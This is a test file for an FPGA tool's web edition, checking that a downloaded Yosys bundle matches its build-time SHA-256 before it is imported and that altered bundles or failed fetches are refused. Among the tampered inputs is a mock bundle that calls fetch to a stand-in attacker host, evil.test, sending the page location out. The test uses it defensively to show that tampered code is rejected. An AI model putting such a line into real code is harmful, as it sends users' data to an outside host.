// packages/silinx-fpga/src/synth-open-yosys.js verifiedYosysUrl (#1445): Yosys's bundle, which the Yosys workers of the static editions
// import from the assets' site, checked against the SHA-256 the build wrote for it before it is imported: a tampered
// bundle is refused; nothing checked where the build wrote none; the check in the Blob workers' code.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { verifiedYosysUrl, yosysWorkerSource } from '../src/synth-open-yosys.js';
import { verifiedYosysUrl as reexported } from '../src/synth-open.js';

const SITE = 'https://pmnmalo.github.io/Silinx-ISE/';
const KEY = 'vendor/yowasp-yosys/0.70.1258/gen/bundle.js';
const URL_ = `${SITE}assets/${KEY}`;
const BUNDLE = 'export async function runYosys() { return {}; }\n';
const sha = text => `sha256-${crypto.createHash('sha256').update(text).digest('base64')}`;

/** A worker's scope with a fake network that answers `body` (status), the integrity map given, SubtleCrypto unless told otherwise. */
function scope({ body = BUNDLE, status = 200, integrity = { [KEY]: sha(BUNDLE) }, subtle = true } = {}) {
  const requests = [];
  return {
    requests, SILINX_ASSET_INTEGRITY: integrity, btoa: globalThis.btoa, crypto: subtle ? globalThis.crypto : {},
    fetch: async (u) => { requests.push(String(u)); return new Response(body, { status }); },
  };
}

test('#1445 the bundle as the build wrote it: fetched once and its URL given to import', async () => {
  const s = scope();
  assert.equal(await verifiedYosysUrl(URL_, s), URL_);
  assert.deepEqual(s.requests, [URL_]);
  assert.equal(reexported, verifiedYosysUrl, 'the package\'s synth-open.js exports it');
});

test('#1445 a tampered bundle (a byte more, another text, empty) is refused; so is a failed fetch', async () => {
  for (const body of [`${BUNDLE} `, 'export async function runYosys() { fetch("https://evil.test/" + location) }', '']) {
    await assert.rejects(verifiedYosysUrl(URL_, scope({ body })), /Yosys's bundle on the site is not the one this page was built with \(its SHA-256 differs\): not run/, body);
  }
  await assert.rejects(verifiedYosysUrl(URL_, scope({ status: 404 })), /Yosys could not be fetched \(404\)/);
  // the digest the build writes (scripts/build-standalone.mjs) is the one compared: another hash of the same text differs
  await assert.rejects(verifiedYosysUrl(URL_, scope({ integrity: { [KEY]: `sha256-${crypto.createHash('sha256').update('other').digest('base64')}` } })), /SHA-256 differs/);
});

test('#1445 nothing checked, no request: no digest written for the bundle (unbuilt), no map at all, a URL outside assets/, no SubtleCrypto', async () => {
  for (const s of [scope({ integrity: { 'vendor/yowasp-yosys/0.70.1258/gen/yosys.core.wasm': sha('x') } }), scope({ integrity: null }), (() => { const s = scope(); delete s.SILINX_ASSET_INTEGRITY; return s; })(), scope({ subtle: false })]) {
    assert.equal(await verifiedYosysUrl(URL_, s), URL_);
    assert.deepEqual(s.requests, []);
  }
  const local = 'http://127.0.0.1:8/vendor/yowasp-yosys/gen/bundle.js';
  const s = scope();
  assert.equal(await verifiedYosysUrl(local, s), local);
  assert.deepEqual(s.requests, []);
});

test('#1445 the Yosys Blob workers\' code checks the bundle before importing it, with the integrity its scope was given', async () => {
  const src = yosysWorkerSource(URL_);
  assert.match(src, /^const yosys = \(async function verifiedYosysUrl\(url, scope = globalThis\) \{[\s\S]*?\n\}\)\("https:\/\/pmnmalo\.github\.io\/Silinx-ISE\/assets\/vendor\/yowasp-yosys\/0\.70\.1258\/gen\/bundle\.js", self\)\.then\(u => import\(u\)\);$/m);
  assert.doesNotMatch(src, /^const yosys = import\(/m, 'never imported unchecked');
  // the check's text, run as the worker runs it (its scope's self), against the fake network
  const fn = /^const yosys = \((async function verifiedYosysUrl[\s\S]*?\n\})\)\(/m.exec(src)[1];
  const check = new Function(`return (${fn});`)();
  assert.equal(await check(URL_, scope()), URL_);
  await assert.rejects(check(URL_, scope({ body: 'tampered' })), /SHA-256 differs/);
});
